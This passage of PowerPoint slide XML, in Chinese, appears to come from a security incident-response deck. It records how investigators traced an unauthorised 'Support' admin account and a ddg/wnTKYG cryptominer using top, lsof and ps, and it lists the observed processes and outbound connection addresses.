                                      <p:cBhvr>
                                        <p:cTn id="12" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="70658"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="70658"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="706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102B49-39CF-EF48-8E80-48D86EF068DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576"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71682" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="539552" y="4653136"/>
            <a:ext cx="7850981"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Step4: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过对服日志排查发现在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017/10/3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>之后出现过多次登录记录账户为：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Support</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>与客户确认后发现该账户不属于客户自用账户怀疑为黑客建立的管理账户该账户登录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>为：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>188.0.189.X </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>归属地为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>俄罗斯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>不排除为跳板主机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="71683"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904632"/>
            <a:ext cx="5832648" cy="3462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97590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71683"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="71683"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7168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71682"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="71682"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="716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F3A7C1-13B3-BC4A-8E06-5FBDD2EA589B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560"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72706" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="683568" y="1484784"/>
            <a:ext cx="785098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Step5: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通查看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Sopport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>账户进行查看发现该账户建立时间为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017/08/26</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>最后登录时间为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017/10/05</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="../../Library/Containers/com.tencent.xinWeChat/Data/Library/Application%20Support/com.tencent.xinWeChat/2.0b4.0.9/f39e17da9696abde00d37413157e210a/Message/MessageTemp/9e20f478899dc29eb19741386f9343c8/Image/301507735703_.pic.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1680" y="2568823"/>
            <a:ext cx="6120680" cy="3493006"/>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28569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2706"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="72706"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7270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C36160-8B31-FD42-8523-731292B4DE23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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74754" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827584" y="2755230"/>
            <a:ext cx="7850981" cy="463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最后清理后，统一查看网络连接、进程、等是否正常，提供相关处置建议。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1916832"/>
            <a:ext cx="1593706"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en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>）结论</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20454725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4754"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="74754"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="747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02B628-C013-BC43-9347-966F17381558}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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75778" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755576" y="2110455"/>
            <a:ext cx="785098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某厂商外网服务器出现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>异常，疑似挖矿程序病毒事件分析；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="650032" y="1628800"/>
            <a:ext cx="2212465"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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>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）事件概述</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="650032" y="3579652"/>
            <a:ext cx="3384376"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Step1:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>查看到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>wnTKYG.noaes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>进程占用大量</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cpu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>资源，和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ddg.2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>可疑进程，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>wnTKYG.noaes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>为挖矿病毒主进程：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623392" y="2868136"/>
            <a:ext cx="2212465"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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>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）事件分析</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片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5976" y="3194158"/>
            <a:ext cx="4700111" cy="2940814"/>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0735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5778"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="75778"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7577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31" presetClass="entr" presetSubtype="0"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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.rotation</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="90"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">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P spid="5" grpId="0"/>
      <p:bldP spid="4" grpId="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58CEE-DE80-E245-82BC-15226B8900B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="446720" y="69269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77826" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="534665" y="1194415"/>
            <a:ext cx="814179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Step2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lsof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>查看对外连接情况，发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>wnTKYG.noaes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>218.248.40.X:8443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>163.172.226.X.rev.poneytelecom.eu:443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>发起</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>TCP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>外连请求；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4"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75" y="2117745"/>
            <a:ext cx="4186238" cy="2325291"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="5"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4722807"/>
            <a:ext cx="6024563" cy="1446610"/>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
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4283968" y="3244094"/>
            <a:ext cx="4572132"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Step3 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>查看挖矿程序进程，程序路径为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>wnTKYg.noaes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，被程序自身删除前已经加载到内存中，可进行挖矿操作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4968365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7826"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="77826"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7782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53" presetClass="entr" presetSubtype="16"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p:bldP spid="6" grpId="0"/>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文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="608335" y="2897114"/>
            <a:ext cx="2281555"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Step4: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ddg.2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>为挖矿病毒守护和传播进程，从运行记录的时间戳得知该操作存在于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> 11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>日</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>时</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>44</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>分，攻击者已于该时间进入服务器：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="79875"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5675710" cy="2132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3848" y="3861048"/>
            <a:ext cx="5757863" cy="2494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2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6483138" y="1691223"/>
            <a:ext cx="2265326"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Step5: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lsof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>查看对外连接情况，发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ddg.2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>218.248.40.228:8443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>发起</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>TCP</a:t>
            </a:r>
            <a:r>
